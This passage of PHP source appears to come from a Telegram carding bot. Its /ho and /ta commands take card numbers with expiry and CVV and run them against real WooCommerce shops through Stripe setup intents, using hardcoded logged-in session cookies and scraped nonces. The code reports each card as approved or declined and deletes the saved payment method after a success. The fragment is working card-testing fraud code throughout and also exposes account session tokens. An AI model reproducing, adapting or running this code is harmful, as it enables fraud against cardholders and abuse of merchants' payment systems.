$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";



if (empty($respo)) {
        $respo = $response;
}

if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Woo Stripe\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Woo Stripe\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Woo Stripe\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}


if ($live) {
    editMessage($chatId, $respuesta, $id_text);
} else {
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}


if (preg_match('/^(!|\/|\.)ho/', $message)) {
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
//$ano   = $i[2];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /ho CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}



//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//

$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}
	
$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

////EXTRAE EL NONCE////
$cc = implode('+', $partes);
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5; et_bloom_optin_optin_3_8f64235d7c_imp=true; mailchimp_user_previous_email=xipay59414%40bulatox.com; mailchimp_user_email=xipay59414%40bulatox.com; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=xipay59414%40bulatox.com%7C1736039379%7CRwmDx6j241K3cZhYxMsvwCW95Ml1lU48Dw0zOlP3elO%7C6b75b3ae5b6484b5ff5f0b6210a4b16bf2e67be21d091427d6436a34c746aab7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; __stripe_sid=d590daae-403c-4e5c-8075-6c45d252a142c31711; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'Referer: https://hoamemberservices.com/my-account/payment-methods/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/createAndConfirmSetupIntentNonce":"([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
/////
$patron = '/pk_live_[a-zA-Z0-9]*/';
preg_match($patron, $response, $coincidencia);
$pk_live = $coincidencia[0];
curl_close($curl);

/////EXTRAE EL ID//

echo "$nonce\n";
echo "$pk_live\n";



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&pasted_fields=number&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhoamemberservices.com&time_on_page=143374&client_attribution_metadata%5Bclient_session_id%5D=39977717-a330-49ea-8bda-8bfad4e083e1&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=0b04b48f-276d-4e18-b076-a9831c4f42edfac586&muid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5&sid=d590daae-403c-4e5c-8075-6c45d252a142c31711&key=pk_live_519doZ4BaFP2UgItppWUDvN6lMzRQOWdAmkEmFW85zYxVwikxsEfCWrZayA4AzRxOPhPx0Ne1yRoppgSGnXehspOX005uDYXtP9&_stripe_version=2024-06-20',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.7',
    'origin: https://js.stripe.com',
    'sec-fetch-site: same-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://js.stripe.com/',
    'priority: u=1, i',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);
echo "$id\n";
////HACE EL AUTH///


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5; et_bloom_optin_optin_3_8f64235d7c_imp=true; mailchimp_user_previous_email=xipay59414%40bulatox.com; mailchimp_user_email=xipay59414%40bulatox.com; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=xipay59414%40bulatox.com%7C1736039379%7CRwmDx6j241K3cZhYxMsvwCW95Ml1lU48Dw0zOlP3elO%7C6b75b3ae5b6484b5ff5f0b6210a4b16bf2e67be21d091427d6436a34c746aab7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=d590daae-403c-4e5c-8075-6c45d252a142c31711',
//  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
//  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'X-Requested-With: XMLHttpRequest',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'sec-ch-ua-mobile: ?1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.7',
    'Origin: https://hoamemberservices.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://hoamemberservices.com/my-account/add-payment-method/',
  ],
]);
	
$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
//------------------------------------------//
//$message = $json['data']['error']['message'];
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "1000: Approved";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5; et_bloom_optin_optin_3_8f64235d7c_imp=true; mailchimp_user_previous_email=xipay59414%40bulatox.com; mailchimp_user_email=xipay59414%40bulatox.com; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=xipay59414%40bulatox.com%7C1736039379%7CRwmDx6j241K3cZhYxMsvwCW95Ml1lU48Dw0zOlP3elO%7C6b75b3ae5b6484b5ff5f0b6210a4b16bf2e67be21d091427d6436a34c746aab7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=d590daae-403c-4e5c-8075-6c45d252a142c31711',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Cache-Control: max-age=0',
    'Upgrade-Insecure-Requests: 1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.7',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Dest: document',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'Referer: https://hoamemberservices.com/my-account/add-payment-method/',
  ],
]);



$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

echo "$url_nonce\n";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://hoamemberservices.com/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=9a113a5b-c798-4adf-b369-5d104171714f59ffb5; et_bloom_optin_optin_3_8f64235d7c_imp=true; mailchimp_user_previous_email=xipay59414%40bulatox.com; mailchimp_user_email=xipay59414%40bulatox.com; wordpress_logged_in_7885489a2636edbf3062cc36bfd92416=xipay59414%40bulatox.com%7C1736039379%7CRwmDx6j241K3cZhYxMsvwCW95Ml1lU48Dw0zOlP3elO%7C6b75b3ae5b6484b5ff5f0b6210a4b16bf2e67be21d091427d6436a34c746aab7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2017%3A45%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; etBloomCookie_optin_3=true; __stripe_sid=d590daae-403c-4e5c-8075-6c45d252a142c31711; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhoamemberservices.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'Upgrade-Insecure-Requests: 1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.7',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-User: ?1',
    'Sec-Fetch-Dest: document',
    'Referer: https://hoamemberservices.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}



$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";



if (empty($respo)) {
        $respo = $response;
}



if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree_CCN (rec)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree_CCN (rec)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree_CCN (rec)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chatId, $respuesta, $id_text);
} else {
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}


if (preg_match('/^(!|\/|\.)ta/', $message)) {
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);

$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /ta CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//



$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}


$cc = implode('+', $partes);

$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://tayhope.com/my-account/add-payment-method/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2F; woocommerce_items_in_cart=1',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'accept-language: es-US,es;q=0.9',
    'sec-ch-ua-platform: "Android"',
  ],
]);

